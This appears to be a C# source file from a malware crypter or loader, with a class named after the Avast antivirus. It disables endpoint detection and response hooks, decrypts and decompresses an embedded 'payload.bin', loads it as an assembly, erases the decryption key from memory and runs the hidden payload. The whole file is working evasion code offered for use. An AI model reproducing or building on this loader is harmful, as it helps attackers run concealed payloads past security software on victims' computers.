using System;
using System.Collections.Generic;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;
using static SXVM.API;
using static SXVM.Settings;

namespace SXVM.Bypasses
{
    internal static class Avast
    {
        internal static void Bypass(string[] args)
        {
            PatchEDR(true, true, true);
            Program.AttachHooks(null);
            MethodInfo mi = Assembly.Load(Decompress(AESDecrypt(ExtractResource(@"payload.bin"), DecryptionKey))).EntryPoint;
            ClearDecryptionKeyFromMemory();
            try
            {
                mi.Invoke(null, new object[] { args });
            }
            catch
            {
                mi.Invoke(null, null);
            }
        }
    }
}
